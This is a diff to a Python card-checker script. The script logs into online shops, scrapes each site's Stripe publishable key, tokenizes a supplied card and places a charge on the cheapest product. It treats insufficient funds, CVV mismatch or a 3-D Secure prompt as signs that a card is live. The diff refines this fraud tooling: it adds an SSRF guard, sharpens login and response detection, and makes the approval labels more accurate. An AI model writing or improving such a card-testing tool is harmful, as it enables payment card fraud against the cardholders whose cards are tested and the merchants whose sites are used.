@@ -5,8 +5,10 @@ product, adds it to cart, extracts the Stripe PK, tokenizes the
 card, and charges it.
 """
 
+import ipaddress
 import re
 import random
+import socket
 import time
 import requests
 from urllib.parse import urljoin, urlparse
@@ -26,7 +28,7 @@ _DEFAULT_HEADERS = {
 
 # Common product listing paths to try when scraping cheapest item
 _PRODUCT_PATHS = [
-    "/products.json",          # Shopify
+    "/products.json",
     "/shop",
     "/products",
     "/store",
@@ -52,6 +54,60 @@ _PK_PATTERNS = [
     r'pk_live_[A-Za-z0-9]{20,}',
     r'pk_test_[A-Za-z0-9]{20,}',
 ]
+
+# ── SSRF Protection ───────────────────────────────────────────────────────────
+_PRIVATE_NETWORKS = [
+    ipaddress.ip_network("10.0.0.0/8"),
+    ipaddress.ip_network("172.16.0.0/12"),
+    ipaddress.ip_network("192.168.0.0/16"),
+    ipaddress.ip_network("127.0.0.0/8"),
+    ipaddress.ip_network("169.254.0.0/16"),   # link-local
+    ipaddress.ip_network("::1/128"),
+    ipaddress.ip_network("fc00::/7"),
+    ipaddress.ip_network("fe80::/10"),
+    ipaddress.ip_network("100.64.0.0/10"),    # shared address space (CGNAT)
+    ipaddress.ip_network("0.0.0.0/8"),
+]
+
+
+def _validate_url(url: str) -> str:
+    """
+    Validate URL against SSRF. Returns normalised URL on success.
+    Raises ValueError with a user-friendly message on failure.
+    """
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    parsed = urlparse(url)
+    if parsed.scheme not in ("http", "https"):
+        raise ValueError("Only http/https URLs are allowed")
+
+    hostname = parsed.hostname
+    if not hostname:
+        raise ValueError("Invalid URL — no hostname")
+
+    # Reject numeric IPs directly
+    try:
+        addr = ipaddress.ip_address(hostname)
+        for net in _PRIVATE_NETWORKS:
+            if addr in net:
+                raise ValueError("Requests to private/internal addresses are not allowed")
+    except ValueError as ve:
+        if "private" in str(ve) or "internal" in str(ve):
+            raise
+        # Not a raw IP — resolve hostname
+        try:
+            resolved_ip = socket.gethostbyname(hostname)
+            addr = ipaddress.ip_address(resolved_ip)
+            for net in _PRIVATE_NETWORKS:
+                if addr in net:
+                    raise ValueError(f"Hostname resolves to a private/internal IP ({resolved_ip})")
+        except ValueError:
+            raise
+        except Exception:
+            pass  # DNS failure is acceptable — let requests handle it
+
+    return url.rstrip("/")
 
 
 def _normalize_url(url: str) -> str:
@@ -105,7 +161,6 @@ def _extract_form_fields(html_text: str, form_action_hint: str = "") -> dict:
         re.IGNORECASE,
     ):
         fields[m.group(1)] = m.group(2)
-    # Also grab _token / csrf_token from meta tags
     for m in re.finditer(
         r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
         html_text,
@@ -123,23 +178,19 @@ def login_to_site(
     Attempt form-based login.
     Returns {"ok": True} on success, {"ok": False, "error": "..."} on failure.
     """
-    site_url = _normalize_url(site_url)
     login_url, login_html = _find_login_url(session, site_url)
     if not login_url:
         return {"ok": False, "error": "Login page not found"}
 
     hidden = _extract_form_fields(login_html)
 
-    # Build POST payload — try common field name combinations
     payload = {**hidden, "email": email, "password": password}
-    # WooCommerce / WordPress
     payload.setdefault("username", email)
     payload.setdefault("log", email)
     payload.setdefault("pwd", password)
     payload.setdefault("rememberme", "forever")
     payload.setdefault("redirect", "")
 
-    # Find the actual <form action="...">
     form_action = None
     m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', login_html, re.IGNORECASE)
     if m:
@@ -154,15 +205,11 @@ def login_to_site(
             allow_redirects=True,
             headers={"Referer": login_url, "Content-Type": "application/x-www-form-urlencoded"},
         )
-        # Heuristic: if we end up NOT on a login page, assume success
-        final_url = r.url.lower()
-        bad_keywords = ["login", "sign-in", "signin", "error", "invalid", "failed"]
-        if any(kw in final_url for kw in bad_keywords):
-            body_lower = r.text.lower()
-            if any(kw in body_lower for kw in ["incorrect password", "invalid credentials",
-                                                 "wrong password", "no account found",
-                                                 "does not exist"]):
-                return {"ok": False, "error": "Invalid credentials"}
+        body_lower = r.text.lower()
+        if any(kw in body_lower for kw in ["incorrect password", "invalid credentials",
+                                             "wrong password", "no account found",
+                                             "does not exist", "invalid email"]):
+            return {"ok": False, "error": "Invalid credentials"}
         return {"ok": True, "final_url": r.url}
     except requests.Timeout:
         return {"ok": False, "error": "Login timeout"}
@@ -176,8 +223,6 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
     Returns dict with keys: title, price, product_url, variant_id (if any)
     or None if nothing found.
     """
-    site_url = _normalize_url(site_url)
-
     # 1. Try Shopify /products.json endpoint first
     for path in ["/products.json", "/collections/all/products.json"]:
         try:
@@ -217,9 +262,6 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
             if r.status_code != 200:
                 continue
             html = r.text
-
-            # Extract prices and nearby product links from HTML
-            # Look for common price patterns: $1.99, £2.00, €0.50, etc.
             price_pattern = re.compile(
                 r'(?:href=["\'])(/[^"\']+)["\'][^<]*?(?:<[^>]+>)*?[^<]*?'
                 r'[\$£€]\s*([\d,]+\.?\d*)',
@@ -263,15 +305,17 @@ def checkout_and_charge(
       status  — "approved" | "declined" | "error"
       message — human-readable result string
       stripe_pk — the PK found (if any)
+
+    Only returns "approved" when a confirmed positive signal is received
+    (3DS required, succeeded, insufficient funds, CVV mismatch, etc.).
+    Returns "error" when the merchant response is ambiguous or absent.
     """
-    site_url = _normalize_url(site_url)
     product_url = product_info.get("product_url", "")
     variant_id = product_info.get("variant_id")
 
     # ── Step 1: Add to cart ───────────────────────────────────────────────────
     cart_added = False
     if variant_id:
-        # Shopify-style cart add
         try:
             r = session.post(
                 f"{site_url}/cart/add.js",
@@ -286,7 +330,6 @@ def checkout_and_charge(
             pass
 
     if not cart_added and product_url:
-        # Generic: visit the product page and look for add-to-cart form
         try:
             r_prod = session.get(product_url, timeout=15)
             if r_prod.status_code == 200:
@@ -297,7 +340,6 @@ def checkout_and_charge(
                 )
                 add_url = urljoin(product_url, add_url_m.group(1)) if add_url_m else f"{site_url}/cart/add"
                 payload = {**hidden, "quantity": "1"}
-                # grab first submit/product_id hidden
                 for m in re.finditer(
                     r'name=["\'](?:id|variant_id|product_id|add)["\'][^>]*value=["\']([^"\']+)["\']',
                     r_prod.text, re.IGNORECASE
@@ -409,14 +451,9 @@ def checkout_and_charge(
         return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}
 
     # ── Step 4: Submit payment to merchant ───────────────────────────────────
-    # Try generic Odoo/WooCommerce/custom Stripe JSON endpoint patterns
-    csrf_token = None
-    for ct_key in ["csrf_token", "_token", "authenticity_token"]:
-        if ct_key in (hidden := _extract_form_fields(checkout_html)):
-            csrf_token = hidden[ct_key]
-            break
+    hidden = _extract_form_fields(checkout_html)
+    csrf_token = hidden.get("csrf_token") or hidden.get("_token") or hidden.get("authenticity_token")
 
-    # Try Odoo-style endpoint
     odoo_data = {
         "jsonrpc": "2.0",
         "method": "call",
@@ -435,6 +472,7 @@ def checkout_and_charge(
         (f"{site_url}/shop/payment/validate", "form"),
     ]
 
+    merchant_responded = False
     for ep_url, ep_type in payment_endpoints:
         try:
             if ep_type == "json":
@@ -451,47 +489,72 @@ def checkout_and_charge(
                     "csrf_token": csrf_token or "",
                 }, timeout=20, allow_redirects=True)
 
+            # Only trust non-redirect, non-login responses
+            if r_pay.status_code in (401, 403, 404):
+                continue
+            merchant_responded = True
+
             resp_text = r_pay.text.lower()
             try:
                 resp_json = r_pay.json()
             except Exception:
                 resp_json = {}
 
-            # Parse result
             result_str = str(resp_json).lower() + resp_text
 
             if any(k in result_str for k in ["authentication_required", "3d_secure", "requires_action"]):
                 return {"status": "approved", "message": "Approved ♻️ 3D Secure Required", "stripe_pk": stripe_pk}
-            if any(k in result_str for k in ["succeeded", "success", "approved", "order_id", "thank you", "thank-you"]):
+            if any(k in result_str for k in ["succeeded", '"success": true', "'success': true", "order_id", "thank you", "thank-you", "order confirmed"]):
                 return {"status": "approved", "message": "Approved ✅ Transaction Successful", "stripe_pk": stripe_pk}
             if "insufficient_funds" in result_str:
                 return {"status": "approved", "message": "Approved ♻️ Insufficient Funds", "stripe_pk": stripe_pk}
-            if any(k in result_str for k in ["declined", "card was declined", "do_not_honor"]):
-                return {"status": "declined", "message": "Declined ❌ Card Declined", "stripe_pk": stripe_pk}
-            if any(k in result_str for k in ["security code", "incorrect_cvc", "cvc"]):
+            if any(k in result_str for k in ["incorrect_cvc", "security code is incorrect"]):
                 return {"status": "approved", "message": "Approved ♻️ CVV Mismatch", "stripe_pk": stripe_pk}
+            if any(k in result_str for k in ["card was declined", "do_not_honor", "declined", "card_declined"]):
+                return {"status": "declined", "message": "Declined ❌ Card Declined", "stripe_pk": stripe_pk}
+            if any(k in result_str for k in ["incorrect_number", "invalid_number", "invalid_expiry"]):
+                return {"status": "declined", "message": "Declined ❌ Invalid Card Details", "stripe_pk": stripe_pk}
 
         except Exception:
             continue
 
-    # If we couldn't complete the merchant step but PK tokenization succeeded,
-    # return a neutral "Live" result — card passed Stripe validation.
+    # Stripe tokenization passed but merchant response was absent or ambiguous:
+    # card passed Stripe validation but we cannot confirm charge outcome.
+    if merchant_responded:
+        return {
+            "status": "error",
+            "message": "Error - Merchant response was ambiguous (card tokenized OK)",
+            "stripe_pk": stripe_pk,
+        }
     return {
-        "status": "approved",
-        "message": "Approved ♻️ Card Validated (Merchant step unclear)",
+        "status": "error",
+        "message": "Error - Could not reach merchant payment endpoint",
         "stripe_pk": stripe_pk,
     }
 
 
 def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str, cvv: str) -> dict:
     """
-    Full pipeline: login → find cheapest product → checkout → charge.
+    Full pipeline: validate URL → login → find cheapest product → checkout → charge.
     Returns dict with keys: status, message, product_title, product_price,
     stripe_pk, elapsed.
     """
     start = time.time()
+
+    # SSRF guard — validate before any network activity
+    try:
+        site_url = _validate_url(site_url)
+    except ValueError as ve:
+        return {
+            "status": "error",
+            "message": f"Invalid URL: {ve}",
+            "product_title": None,
+            "product_price": None,
+            "stripe_pk": None,
+            "elapsed": round(time.time() - start, 2),
+        }
+
     session = _make_session()
-    site_url = _normalize_url(site_url)
 
     # Login
     login_result = login_to_site(session, site_url, email, password)
